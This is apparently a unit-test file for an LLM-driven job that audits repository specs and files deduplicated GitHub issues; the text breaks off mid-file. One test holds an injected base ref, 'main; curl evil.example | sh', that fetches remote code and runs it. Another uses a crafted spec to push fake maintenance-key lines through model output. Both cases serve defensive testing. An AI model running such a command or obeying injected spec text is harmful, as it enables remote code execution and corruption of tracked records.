// Run-level unit tests for `org-spec-audit` — drive the run against the
// in-memory test runtime (`makeCFRuntimeTest`) with seeded config + sandbox +
// model fakes. No CF, no Docker, no model provider.
//
// The property most of this file exists to pin: **a question already on file is
// not filed again.** The `github` fake appends every `openIssue` to the same
// list `issues` reads back, so "the second sweep sees the first sweep's issue"
// is expressible here rather than only in production.

import { it } from "@effect/vitest";
import { Effect } from "effect";
import { describe, expect } from "vitest";
import { makeCFRuntimeTest } from "@fractalboxdev/flare-dispatch-core/testing";
import {
  Github,
  GitHubApiError,
  type IssueRef,
  type ModelCompletionResult,
} from "@fractalboxdev/flare-dispatch-core";
import type { SuppressionReport } from "@fractalboxdev/flare-dispatch-core/primitives";
import {
  firstMaintenanceKey,
  indexFiledQuestions,
  issueTitle,
  mergeAcrossRepos,
  orgSpecAudit,
  parseLabel,
  parsePositiveInt,
  parseWindowHours,
  renderIssueBody,
  renderNotice,
} from "./org-spec-audit";

const firedAt = Date.UTC(2026, 7, 8); // 2026-08-08
const input = { firedAt } as const;

/** Nothing suppressed, nothing broken — the shape most render tests want. */
const noSuppression: SuppressionReport = { allowed: [], suppressed: [], degraded: [] };

/** A tools-mode model result returning the `report_open_questions` payload. */
const reported = (questions: unknown[]): ModelCompletionResult => ({
  toolCalls: [{ name: "report_open_questions", arguments: { questions } }],
  text: "",
});

/** A tools-mode result for the reconcile call — minted key → on-file key. */
const matched = (matches: Array<{ minted: string; existing: string }>): ModelCompletionResult => ({
  toolCalls: [{ name: "report_key_matches", arguments: { matches } }],
  text: "",
});

const question = (over: Record<string, unknown> = {}) => ({
  group: "decide",
  question: "Does the dispatcher still commit to per-run spend caps?",
  evidence: "specs/runs.md says every run declares a cap; no source declares one.",
  specPath: "specs/runs.md",
  assumption: "keep the spec, mark the section Planned",
  key: "per-run-spend-caps",
  ...over,
});

const KEY = "org-spec-audit/per-run-spend-caps";
const LABEL = "maintenance:open-question";

/** A question already on file in the control repo — the ledger, seeded. */
const filedIssue = (over: Partial<IssueRef> & { key?: string } = {}): IssueRef => {
  const { key = KEY, ...rest } = over;
  return {
    repo: "owner/control",
    number: 41,
    title: "Does the dispatcher still commit to per-run spend caps?",
    // The key on the FIRST line, which is where `renderIssueBody` puts it.
    body: `maintenance-key: ${key}\n<!-- flare-dispatch: org-spec-audit -->\n\nprose`,
    state: "open" as const,
    labels: [LABEL, "question:decide"],
    author: "flare-dispatch[bot]",
    authorAssociation: "OWNER",
    url: "https://github.com/owner/control/issues/41",
    commentCount: 0,
    createdAt: firedAt - 86_400_000,
    updatedAt: firedAt - 86_400_000,
    ...rest,
  };
};

const baseConfig = {
  "org-spec-audit.repos": "owner/alpha owner/beta",
  "org-spec-audit.control-repo": "owner/control",
  "org-spec-audit.workers-ai.model": "@cf/meta/llama-3.3-70b-instruct-fp8-fast",
};

/** `baseConfig` with one key genuinely absent — not present-and-undefined. */
const withoutKey = (config: Record<string, string>, drop: string): Record<string, string> =>
  Object.fromEntries(Object.entries(config).filter(([k]) => k !== drop));

/** Specs present, a file tree, and commits inside the window. */
const activeSandbox = {
  "specs/*.md": { exitCode: 0, stdout: "\n===FILE specs/runs.md===\nevery run declares a cap" },
  "head -800": { exitCode: 0, stdout: "specs/runs.md\nsrc/a.ts" },
  "git log --oneline": { exitCode: 0, stdout: "abc feat: thing" },
};

describe("org-spec-audit", () => {
  it.effect("is a no-op when the estate is unset", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: { "org-spec-audit.workers-ai.model": "m" },
      sandboxProgram: activeSandbox,
    });

    return Effect.gen(function* () {
      const out = yield* orgSpecAudit.run(input);
      expect(out.reposSwept).toBe(0);
      expect(out.questionsFiled).toBe(0);
      expect(handles.github.openIssueCalls).toHaveLength(0);
    }).pipe(Effect.provide(layer));
  });

  it.effect("merges the same question across repos into ONE issue", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: baseConfig,
      sandboxProgram: activeSandbox,
      modelGateway: {
        // Both repos raise the same key — the merge is the point of sweeping.
        responses: [reported([question()]), reported([question()])],
      },
      github: { now: firedAt },
    });

    return Effect.gen(function* () {
      const out = yield* orgSpecAudit.run(input);
      expect(out.reposSwept).toBe(2);
      expect(out.questionsRaised).toBe(2);
      expect(out.questionsAfterMerge).toBe(1);
      expect(out.questionsFiled).toBe(1);

      const calls = handles.github.openIssueCalls;
      expect(calls).toHaveLength(1);
      expect(calls[0]!.repo).toBe("owner/control");
      expect(calls[0]!.title).toBe("Does the dispatcher still commit to per-run spend caps?");
      // Both repos are named as sources on the single merged issue.
      expect(calls[0]!.body).toContain("owner/alpha");
      expect(calls[0]!.body).toContain("owner/beta");
      // The index label and the lane label, from the defaults.
      expect(calls[0]!.labels).toEqual([LABEL, "question:decide"]);
    }).pipe(Effect.provide(layer));
  });

  // The property the whole redesign exists for. #147 and #148 asked three of the
  // same questions two days apart, two of them under a byte-identical key,
  // because nothing read the key back against a question that was merely OPEN.
  it.effect("files nothing when every question is already on file", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: baseConfig,
      sandboxProgram: activeSandbox,
      modelGateway: { responses: [reported([question()]), reported([question()])] },
      github: { now: firedAt, issues: [filedIssue()] },
    });

    return Effect.gen(function* () {
      const out = yield* orgSpecAudit.run(input);
      expect(out.questionsAfterMerge).toBe(1);
      expect(out.questionsAlreadyFiled).toBe(1);
      expect(out.questionsFiled).toBe(0);
      expect(handles.github.openIssueCalls).toHaveLength(0);
      // Silent in the channel too: re-announcing a standing question is the
      // daily file again, one line long.
      expect(handles.notice.published).toHaveLength(0);
    }).pipe(Effect.provide(layer));
  });

  it.effect("never re-files or reopens a question that was answered and closed", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: baseConfig,
      sandboxProgram: activeSandbox,
      modelGateway: { responses: [reported([question()]), reported([question()])] },
      github: {
        now: firedAt,
        issues: [filedIssue({ state: "closed", closedAt: firedAt - 200 * 86_400_000 })],
      },
    });

    return Effect.gen(function* () {
      const out = yield* orgSpecAudit.run(input);
      // Closed means decided. Not a cooldown, not a 30-day window — a question
      // answered 200 days ago is still answered.
      expect(out.questionsAlreadyFiled).toBe(1);
      expect(out.questionsFiled).toBe(0);
      expect(handles.github.openIssueCalls).toHaveLength(0);
      // And nothing reopens it: the run has no reopen, and does not comment.
      expect(handles.github.addIssueLabelsCalls).toHaveLength(0);
      expect(handles.github.commentOnIssueCalls).toHaveLength(0);
      expect(handles.github.closeIssueAsDuplicateCalls).toHaveLength(0);
    }).pipe(Effect.provide(layer));
  });

  it.effect("asks for every state, un-windowed, strictly, under the questions label", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: baseConfig,
      sandboxProgram: activeSandbox,
      modelGateway: { responses: [reported([question()]), reported([question()])] },
      github: { now: firedAt },
    });

    return Effect.gen(function* () {
      yield* orgSpecAudit.run(input);
      const [call] = handles.github.issuesCalls;
      // Each of these is one edit away from silently breaking dedup: `open` would
      // re-file every answered question, a window would resurrect the old ones,
      // and a non-strict read answers "not filed" for whatever the page ceiling
      // cut off.
      expect(call).toMatchObject({ repo: "owner/control", state: "all", strict: true });
      expect(call!.labels).toEqual([LABEL]);
      expect(call!.updatedWithinDays).toBeUndefined();
    }).pipe(Effect.provide(layer));
  });

  // The inversion. With one PR a day an unreadable ledger cost one duplicate PR,
  // so failing open was right. An unreadable ISSUE SET costs a duplicate of
  // every question at once.
  it.effect("files nothing at all when it cannot read what it already asked", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: baseConfig,
      sandboxProgram: activeSandbox,
      modelGateway: { responses: [reported([question()]), reported([question()])] },
      github: { now: firedAt },
    });

    return Effect.gen(function* () {
      const fake = yield* Github;
      const exit = yield* Effect.exit(
        orgSpecAudit.run(input).pipe(
          Effect.provideService(Github, {
            ...fake,
            issues: () => Effect.fail(new GitHubApiError({ status: 500, reason: "transient" })),
          }),
        ),
      );

      expect(exit._tag).toBe("Failure");
      expect(handles.github.openIssueCalls).toHaveLength(0);
      // It loses a day and no facts: the questions are re-derived tomorrow.
      expect(handles.notice.published).toHaveLength(0);
    }).pipe(Effect.provide(layer));
  });

  // The read is deliberately ahead of the sweep: it is one cheap call whose
  // failure ends the tick, and reading it afterwards would mean paying for an
  // estate of model calls and discarding every one.
  it.effect("reads the ledger before spending a single model call", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: baseConfig,
      sandboxProgram: activeSandbox,
      modelGateway: { responses: [reported([question()]), reported([question()])] },
      github: { now: firedAt },
    });

    return Effect.gen(function* () {
      const fake = yield* Github;
      yield* Effect.exit(
        orgSpecAudit.run(input).pipe(
          Effect.provideService(Github, {
            ...fake,
            issues: () => Effect.fail(new GitHubApiError({ status: 500, reason: "transient" })),
          }),
        ),
      );
      expect(handles.modelGateway.requests).toHaveLength(0);
      expect(handles.sandbox.clones).toHaveLength(0);
    }).pipe(Effect.provide(layer));
  });

  // The run holds no default control repo on purpose: a default is a repo
  // somebody else's deployment files issues on. Unset must stop the run, and
  // stop it BEFORE the sweep — an hour of model calls whose output has nowhere
  // to go is the expensive way to learn a key is missing.
  it.effect("fails when no control repo is configured, before sweeping anything", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: withoutKey(baseConfig, "org-spec-audit.control-repo"),
      sandboxProgram: activeSandbox,
      modelGateway: { responses: [reported([question()]), reported([question()])] },
    });

    return Effect.gen(function* () {
      const exit = yield* Effect.exit(orgSpecAudit.run(input));
      expect(exit._tag).toBe("Failure");
      expect(JSON.stringify(exit)).toContain("org-spec-audit.control-repo");
      // Nothing was cloned, nothing was executed, nothing was filed.
      expect(handles.github.openIssueCalls).toHaveLength(0);
      expect(handles.sandbox.clones).toHaveLength(0);
      expect(handles.sandbox.execs).toHaveLength(0);
    }).pipe(Effect.provide(layer));
  });

  it.effect("labels issues the way config says, not the way the run was born", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: {
        ...baseConfig,
        "org-spec-audit.questions-label": "loop:question",
        "org-spec-audit.lane-label-prefix": "answer-by-",
      },
      sandboxProgram: activeSandbox,
      modelGateway: { responses: [reported([question()]), reported([question()])] },
      github: { now: firedAt },
    });

    return Effect.gen(function* () {
      yield* orgSpecAudit.run(input);
      expect(handles.github.openIssueCalls[0]!.labels).toEqual([
        "loop:question",
        "answer-by-decide",
      ]);
      // The read filters on the same label it writes — the two being one value
      // is what makes dedup work at all.
      expect(handles.github.issuesCalls[0]!.labels).toEqual(["loop:question"]);
    }).pipe(Effect.provide(layer));
  });

  // A comma makes the filter and the write two different things: GitHub's list
  // query joins labels on commas, so the read would filter on two labels while
  // the write applied one — and every question would re-file forever, silently.
  it.effect("refuses a questions label carrying a comma, before reading anything", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: { ...baseConfig, "org-spec-audit.questions-label": "loop:question,bug" },
      sandboxProgram: activeSandbox,
      modelGateway: { responses: [reported([question()])] },
    });

    return Effect.gen(function* () {
      const exit = yield* Effect.exit(orgSpecAudit.run(input));
      expect(exit._tag).toBe("Failure");
      expect(JSON.stringify(exit)).toContain("org-spec-audit.questions-label");
      expect(handles.github.issuesCalls).toHaveLength(0);
      expect(handles.github.openIssueCalls).toHaveLength(0);
    }).pipe(Effect.provide(layer));
  });

  it.effect("announces the delta, links each issue, and names no channel", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: baseConfig,
      sandboxProgram: activeSandbox,
      modelGateway: { responses: [reported([question()]), reported([question()])] },
      github: { now: firedAt },
    });

    return Effect.gen(function* () {
      yield* orgSpecAudit.run(input);

      const [notice] = handles.notice.published;
      if (notice === undefined) throw new Error("no notice was published");

      expect(notice.text).toContain("1 new question(s)");
      expect(notice.text).toContain("1 open");
      // A KIND of message, never a room. The receiver maps this to a channel
      // from its own config; nothing here can name one.
      expect(notice.useCase).toBe("org-spec-audit");
      expect(JSON.stringify(notice)).not.toMatch(/channel/i);
      // Issue links ride as typed entries, because markup inside `text` would be
      // escaped by the receiver along with everything else.
      expect(notice.links).toEqual([
        { url: "https://github.com/owner/control/issues/1", label: "#1" },
      ]);
    }).pipe(Effect.provide(layer));
  });

  it.effect("keys the notice on the day, so a retried step cannot double-post", () => {
    // The receiver dedups on `<run>:<dedupeKey>` and claims it before posting,
    // so the id has to be a function of the run and the day — never a clock or
    // a random. This is the same string the schedule's idempotency key uses.
    const { layer, handles } = makeCFRuntimeTest({
      config: baseConfig,
      sandboxProgram: activeSandbox,
      modelGateway: { responses: [reported([question()]), reported([question()])] },
      github: { now: firedAt },
    });

    return Effect.gen(function* () {
      yield* orgSpecAudit.run(input);
      expect(handles.notice.published[0]!.dedupeKey).toBe("2026-08-08");
      expect(
        orgSpecAudit.schedules?.[0]?.idempotencyKey({ cron: "45 5 * * *", firedAt }),
      ).toContain("2026-08-08");
    }).pipe(Effect.provide(layer));
  });

  it.effect("keeps the issues and the verdict when the notice does not land", () => {
    // The questions are already on GitHub, which is the copy that has to
    // survive. An announcement that failed must not make the sweep a failure.
    const { layer, handles } = makeCFRuntimeTest({
      config: baseConfig,
      sandboxProgram: activeSandbox,
      modelGateway: { responses: [reported([question()]), reported([question()])] },
      github: { now: firedAt },
      notice: { outcome: "failed" },
    });

    return Effect.gen(function* () {
      const out = yield* orgSpecAudit.run(input);
      expect(out.questionsFiled).toBe(1);
      expect(handles.github.openIssueCalls).toHaveLength(1);
    }).pipe(Effect.provide(layer));
  });

  it.effect("skips a repo with no commits in the window, before any model call", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: baseConfig,
      sandboxProgram: { ...activeSandbox, "git log --oneline": { exitCode: 0, stdout: "" } },
      modelGateway: { responses: [] },
      github: { now: firedAt },
    });

    return Effect.gen(function* () {
      const out = yield* orgSpecAudit.run(input);
      expect(out.reposSwept).toBe(0);
      expect(out.reposSkipped).toBe(2);
      expect(handles.github.openIssueCalls).toHaveLength(0);
    }).pipe(Effect.provide(layer));
  });

  it.effect("stays silent when nothing needs an answer", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: baseConfig,
      sandboxProgram: activeSandbox,
      modelGateway: { responses: [reported([]), reported([])] },
      github: { now: firedAt },
    });

    return Effect.gen(function* () {
      const out = yield* orgSpecAudit.run(input);
      expect(out.reposSwept).toBe(2);
      expect(out.questionsAfterMerge).toBe(0);
      expect(out.questionsFiled).toBe(0);
      expect(handles.github.openIssueCalls).toHaveLength(0);
      // Empty means silent in the channel too. A digest that fires whether or
      // not there is news is one people stop reading, and by then it has
      // nothing left to spend.
      expect(handles.notice.published).toHaveLength(0);
    }).pipe(Effect.provide(layer));
  });

  it("declares the cron the wrangler triggers must carry", () => {
    expect(orgSpecAudit.schedules?.[0]?.cron).toBe("45 5 * * *");
  });

  it.effect("refuses an estate entry that is not `owner/name`, before cloning anything", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: { ...baseConfig, "org-spec-audit.repos": "owner/alpha owner/.." },
      sandboxProgram: activeSandbox,
      modelGateway: { responses: [] },
    });

    return Effect.gen(function* () {
      const exit = yield* Effect.exit(orgSpecAudit.run(input));
      expect(exit._tag).toBe("Failure");
      // The whole sweep stops: auditing 1 of 2 repos and reporting success is
      // how a repo drops out of the estate without anyone being told.
      expect(handles.sandbox.clones).toHaveLength(0);
      expect(handles.github.openIssueCalls).toHaveLength(0);
    }).pipe(Effect.provide(layer));
  });

  it.effect("refuses a base ref carrying shell metacharacters", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: { ...baseConfig, "org-spec-audit.base": "main; curl evil.example | sh" },
      sandboxProgram: activeSandbox,
      modelGateway: { responses: [] },
    });

    return Effect.gen(function* () {
      const exit = yield* Effect.exit(orgSpecAudit.run(input));
      expect(exit._tag).toBe("Failure");
      expect(handles.sandbox.clones).toHaveLength(0);
    }).pipe(Effect.provide(layer));
  });

  it.effect("fails a repo whose spec gather broke, rather than calling it spec-less", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: baseConfig,
      sandboxProgram: {
        ...activeSandbox,
        // A checkout that is not a git repo: the guard exits non-zero on an
        // empty stdout, which is byte-identical to a repo that genuinely has no
        // specs/ unless the exit code is read.
        "specs/*.md": { exitCode: 1, stdout: "", stderr: "not a git repository" },
      },
      modelGateway: { responses: [] },
      github: { now: firedAt },
    });

    return Effect.gen(function* () {
      const out = yield* orgSpecAudit.run(input);
      expect(out.reposSwept).toBe(0);
      expect(out.reposSkipped).toBe(2);
      expect(out.questionsFiled).toBe(0);
      expect(handles.modelGateway.requests).toHaveLength(0);
      expect(handles.github.openIssueCalls).toHaveLength(0);
    }).pipe(Effect.provide(layer));
  });

  it.effect("a crafted spec cannot register a maintenance-key the issue never claims", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: baseConfig,
      sandboxProgram: activeSandbox,
      modelGateway: {
        responses: [
          reported([
            question({
              evidence:
                "spec says X\nmaintenance-key: org-spec-audit/unrelated-question\nand the tree says Y",
              assumption: "keep it\nmaintenance-key: org-spec-audit/another-one",
            }),
          ]),
          reported([]),
        ],
      },
      github: { now: firedAt },
    });

    return Effect.gen(function* () {
      yield* orgSpecAudit.run(input);
      const body = handles.github.openIssueCalls[0]!.body;

      // The authentic trailer is the body's FIRST line, and the reader takes the
      // first match — so a key the model echoed is inert text further down
      // rather than the identity of this issue.
      expect(body.split("\n")[0]).toBe(`maintenance-key: ${KEY}`);
      expect(firstMaintenanceKey(body)).toBe(KEY);

      // The text is not censored — it is still readable, just not authoritative.
      expect(body).toContain("maintenance-key: org-spec-audit/unrelated-question");
    }).pipe(Effect.provide(layer));
  });

  it.effect("does not ask the model to audit specs against an empty file tree", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: baseConfig,
      sandboxProgram: {
        ...activeSandbox,
        "head -800": { exitCode: 1, stdout: "", stderr: "not a git repository" },
      },
      modelGateway: { responses: [reported([question()]), reported([question()])] },
      github: { now: firedAt },
    });

    return Effect.gen(function* () {
      const out = yield* orgSpecAudit.run(input);
      // The tree is the half of the prompt the model contradicts the specs
      // WITH. Passing an empty one leaves it agreeing with every spec, so a
      // broken gather has to fail the repo, not proceed with half a prompt.
      expect(handles.modelGateway.requests).toHaveLength(0);
      expect(out.reposSwept).toBe(0);
      expect(out.reposSkipped).toBe(2);
      expect(out.questionsFiled).toBe(0);
    }).pipe(Effect.provide(layer));
  });
});

// --- The per-sweep cap -------------------------------------------------------

describe("org-spec-audit — the cap", () => {
  const seven = Array.from({ length: 7 }, (_unused, i) =>
    question({ key: `q${i}`, question: `Question ${i}?` }),
  );

  it.effect("files up to the cap and says what it held, never truncating silently", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: { ...baseConfig, "org-spec-audit.max-new-questions": "2" },
      sandboxProgram: activeSandbox,
      modelGateway: { responses: [reported(seven), reported([])] },
      github: { now: firedAt },
    });

    return Effect.gen(function* () {
      const out = yield* orgSpecAudit.run(input);
      expect(out.questionsAfterMerge).toBe(7);
      expect(out.questionsFiled).toBe(2);
      expect(out.questionsHeldByCap).toBe(5);
      expect(handles.github.openIssueCalls).toHaveLength(2);
      // A shorter list that does not say it is shorter reads as fewer problems.
      expect(handles.notice.published[0]!.text).toContain("Held by the per-sweep cap: 5");
    }).pipe(Effect.provide(layer));
  });

  it.effect("files the held-back questions on the next sweep, since none are on file", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: { ...baseConfig, "org-spec-audit.max-new-questions": "2" },
      sandboxProgram: activeSandbox,
      // Two ticks: sweeps for run 1, sweeps for run 2, then run 2's reconcile.
      // The fake repeats its last entry, so `matched([])` covers that and after.
      modelGateway: {
        responses: [reported(seven), reported([]), reported(seven), reported([]), matched([])],
      },
      github: { now: firedAt },
    });

    return Effect.gen(function* () {
      yield* orgSpecAudit.run(input);
      expect(handles.github.openIssueCalls).toHaveLength(2);
      // Second tick: the two filed are found on file, the other five are not.
      const out = yield* orgSpecAudit.run(input);
      expect(out.questionsAlreadyFiled).toBe(2);
      expect(out.questionsFiled).toBe(2);
      expect(handles.github.openIssueCalls).toHaveLength(4);
    }).pipe(Effect.provide(layer));
  });

  it.effect("defaults the cap when the value is nonsense", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: { ...baseConfig, "org-spec-audit.max-new-questions": "-3" },
      sandboxProgram: activeSandbox,
      modelGateway: { responses: [reported(seven), reported([])] },
      github: { now: firedAt },
    });

    return Effect.gen(function* () {
      const out = yield* orgSpecAudit.run(input);
      expect(out.questionsFiled).toBe(5);
      expect(handles.github.openIssueCalls).toHaveLength(5);
    }).pipe(Effect.provide(layer));
  });
});

// --- Key reconciliation: the same question, worded differently ---------------

describe("org-spec-audit — key reconciliation", () => {
  /** The same question as `filedIssue()`, minted under a different verb. */
  const rephrased = question({
    key: "spend-caps-per-run",
    question: "Are per-run spend caps still committed to?",
  });

  it.effect("does not re-file a question the model matches onto one on file", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: baseConfig,
      sandboxProgram: activeSandbox,
      modelGateway: {
        responses: [
          reported([rephrased]),
          reported([]),
          matched([{ minted: "spend-caps-per-run", existing: "per-run-spend-caps" }]),
        ],
      },
      github: { now: firedAt, issues: [filedIssue()] },
    });

    return Effect.gen(function* () {
      const out = yield* orgSpecAudit.run(input);
      expect(out.questionsAlreadyFiled).toBe(1);
      expect(out.questionsFiled).toBe(0);
      expect(handles.github.openIssueCalls).toHaveLength(0);
      expect(
        handles.io.logs.some((l) => l.msg.includes("reconciled onto") && l.msg.includes(KEY)),
      ).toBe(true);
    }).pipe(Effect.provide(layer));
  });

  // The containment: an answer naming a key that was never read decides nothing.
  // A missed match costs a human one click; an accepted hallucination is a
  // question that is never asked again.
  it.effect("files anyway when the model matches onto a key nobody has on file", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: baseConfig,
      sandboxProgram: activeSandbox,
      modelGateway: {
        responses: [
          reported([rephrased]),
          reported([]),
          matched([{ minted: "spend-caps-per-run", existing: "a-question-nobody-asked" }]),
        ],
      },
      github: { now: firedAt, issues: [filedIssue()] },
    });

    return Effect.gen(function* () {
      const out = yield* orgSpecAudit.run(input);
      expect(out.questionsFiled).toBe(1);
      expect(handles.github.openIssueCalls).toHaveLength(1);
    }).pipe(Effect.provide(layer));
  });

  it.effect("files anyway when the reconcile call fails", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: baseConfig,
      sandboxProgram: activeSandbox,
      // The third call returns a sweep payload, which cannot parse as a
      // reconciliation — the same shape a model failure takes here.
      modelGateway: { responses: [reported([rephrased]), reported([]), reported([])] },
      github: { now: firedAt, issues: [filedIssue()] },
    });

    return Effect.gen(function* () {
      const out = yield* orgSpecAudit.run(input);
      expect(out.questionsFiled).toBe(1);
      expect(
        handles.io.logs.some((l) => l.level === "warn" && l.msg.includes("all 1 as new")),
      ).toBe(true);
    }).pipe(Effect.provide(layer));
  });

  it.effect("spends nothing on reconciliation when nothing is on file", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: baseConfig,
      sandboxProgram: activeSandbox,
      modelGateway: { responses: [reported([question()]), reported([])] },
      github: { now: firedAt },
    });

    return Effect.gen(function* () {
      yield* orgSpecAudit.run(input);
      // Two sweeps, no third call: on a fresh control repo every question is new
      // by construction and there is nothing to match against.
      expect(handles.modelGateway.requests).toHaveLength(2);
      expect(
        handles.modelGateway.requests.some((r) => JSON.stringify(r).includes("report_key_matches")),
      ).toBe(false);
    }).pipe(Effect.provide(layer));
  });

  it.effect("skips reconciliation for a question whose key already matches exactly", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: baseConfig,
      sandboxProgram: activeSandbox,
      modelGateway: { responses: [reported([question()]), reported([])] },
      github: { now: firedAt, issues: [filedIssue()] },
    });

    return Effect.gen(function* () {
      const out = yield* orgSpecAudit.run(input);
      expect(out.questionsAlreadyFiled).toBe(1);
      // An exact key match IS the same question. Paying a model to confirm it
      // would be spend with no decision attached.
      expect(handles.modelGateway.requests).toHaveLength(2);
    }).pipe(Effect.provide(layer));
  });
});

// --- Suppression: the pre-emptive half, and the half that retired ------------

const LEDGER = "owner/control:maintenance/declined.jsonl";

describe("org-spec-audit — suppression", () => {
  it.effect("never files a question the ledger declined", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: baseConfig,
      sandboxProgram: activeSandbox,
      modelGateway: { responses: [reported([question()]), reported([question()])] },
      github: {
        now: firedAt,
        files: {
          [LEDGER]: JSON.stringify({
            key: KEY,
            reason: "answered in ADR-0011; the spec is right",
            by: "@ada",
            at: "2026-08-01",
          }),
        },
      },
    });

    return Effect.gen(function* () {
      const out = yield* orgSpecAudit.run(input);
      expect(out.questionsAfterMerge).toBe(1);
      expect(out.questionsSuppressed).toBe(1);
      expect(out.questionsFiled).toBe(0);
      expect(handles.github.openIssueCalls).toHaveLength(0);
      // Nothing announced either: re-broadcasting a declined question into a
      // channel is the louder half of re-proposing it, and the one nobody can
      // close.
      expect(handles.notice.published).toHaveLength(0);
    }).pipe(Effect.provide(layer));
  });

  // No PRs ⇒ no PR history ⇒ no cooldown. A prefix matching nothing would answer
  // "no prior proposals" every tick, for a reason no reader could tell apart
  // from the feature being off.
  it.effect("reads no PR history at all", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: baseConfig,
      sandboxProgram: activeSandbox,
      modelGateway: { responses: [reported([question()]), reported([question()])] },
      github: { now: firedAt },
    });

    return Effect.gen(function* () {
      yield* orgSpecAudit.run(input);
      expect(handles.github.pullRequestHistoryCalls).toHaveLength(0);
      expect(handles.github.openIssueCalls).toHaveLength(1);
    }).pipe(Effect.provide(layer));
  });

  it.effect("reads the ledger where `declined-path` says, and says so in the issue", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: { ...baseConfig, "org-spec-audit.declined-path": "infra/loop/declined.jsonl" },
      sandboxProgram: activeSandbox,
      modelGateway: { responses: [reported([question()]), reported([question()])] },
      github: { now: firedAt, files: { "owner/control:infra/loop/declined.jsonl": "" } },
    });

    return Effect.gen(function* () {
      yield* orgSpecAudit.run(input);
      const calls = handles.github.openIssueCalls;
      expect(calls).toHaveLength(1);
      expect(calls[0]!.body).toContain("`infra/loop/declined.jsonl`");
      expect(calls[0]!.body).not.toContain("maintenance/declined.jsonl");
    }).pipe(Effect.provide(layer));
  });

  it.effect("skips a malformed ledger line and honours the rest", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: baseConfig,
      sandboxProgram: activeSandbox,
      modelGateway: { responses: [reported([question()]), reported([question()])] },
      github: {
        now: firedAt,
        files: {
          [LEDGER]: [
            "}}} not json at all",
            JSON.stringify({ key: KEY, reason: "settled", by: "@ada", at: "2026-08-01" }),
          ].join("\n"),
        },
      },
    });

    return Effect.gen(function* () {
      const out = yield* orgSpecAudit.run(input);
      expect(out.questionsSuppressed).toBe(1);
      expect(handles.io.logs.some((l) => l.level === "warn" && l.msg.includes("not JSON"))).toBe(
        true,
      );
    }).pipe(Effect.provide(layer));
  });

  // The ledger read still fails OPEN, and the asymmetry with the issue read is
  // the point: one issue a human closes, versus a duplicate of everything.
  it.effect("files anyway — and says so — when the ledger cannot be read", () => {
    const { layer, handles } = makeCFRuntimeTest({
      config: baseConfig,
      sandboxProgram: activeSandbox,
      modelGateway: { responses: [reported([question()]), reported([question()])] },
      github: { now: firedAt },
    });

    return Effect.gen(function* () {
      const fake = yield* Github;
      const out = yield* orgSpecAudit.run(input).pipe(
        Effect.provideService(Github, {
          ...fake,
          readTextFile: () => Effect.fail(new GitHubApiError({ status: 500, reason: "transient" })),
        }),
      );

      expect(out.questionsSuppressed).toBe(0);
      expect(out.questionsFiled).toBe(1);
      expect(handles.notice.published[0]!.text).toContain("Suppression degraded");
      expect(handles.io.logs.some((l) => l.level === "warn" && l.msg.includes("unreadable"))).toBe(
        true,
      );
    }).pipe(Effect.provide(layer));
  });

  it.effect("reports the suppressed count and reason in the notice", () => {
    // Two questions: one declined, one still open — so something is filed AND
    // there is something to explain. A shorter list with no explanation reads as
    // "fewer problems", which is the opposite of true.
    const { layer, handles } = makeCFRuntimeTest({
      config: baseConfig,
      sandboxProgram: activeSandbox,
      modelGateway: {
        responses: [
          reported([
            question(),
            question({ key: "who-owns-egress", question: "Who owns egress?" }),
          ]),
          reported([]),
        ],
      },
      github: {
        now: firedAt,
        files: {
          [LEDGER]: JSON.stringify({
            key: KEY,
            reason: "answered in ADR-0011",
            by: "@ada",
            at: "2026-08-01",
          }),
        },
      },
    });

    return Effect.gen(function* () {
      const out = yield* orgSpecAudit.run(input);
      expect(out.questionsAfterMerge).toBe(2);
      expect(out.questionsSuppressed).toBe(1);
      expect(out.questionsFiled).toBe(1);

      const text = handles.notice.published[0]!.text;
      expect(text).toContain("**Suppressed: 1**");
      expect(text).toContain("answered in ADR-0011");
      expect(text).toContain("1 declined");
      // The surviving question is still asked; the declined one is gone.
      expect(text).toContain("Who owns egress?");
      expect(text).not.toContain("Does the dispatcher still commit");
    }).pipe(Effect.provide(layer));
  });

  it.effect("carries one maintenance-key per issue, keyed on the question", () => {
    // A dated key would be unique every day and match nothing, ever.
    const { layer, handles } = makeCFRuntimeTest({
      config: baseConfig,
      sandboxProgram: activeSandbox,
      modelGateway: { responses: [reported([question()]), reported([question()])] },
      github: { now: firedAt },
    });

    return Effect.gen(function* () {
      yield* orgSpecAudit.run(input);
      const body = handles.github.openIssueCalls[0]!.body;
      expect(body).toContain(`maintenance-key: ${KEY}`);
      expect(body).not.toContain("maintenance-key: org-spec-audit/2026-08-08");
    }).pipe(Effect.provide(layer));
  });
});

describe("mergeAcrossRepos", () => {
  const raised = (over: Record<string, unknown> = {}) =>
    ({
      repo: "o/a",
      group: "decide" as const,
      question: "Does X still commit to Y?",
      evidence: "spec says A, tree says B",
      specPath: "specs/x.md",
      assumption: "assume nothing changes",
      key: "x-commits-to-y",
      ...over,
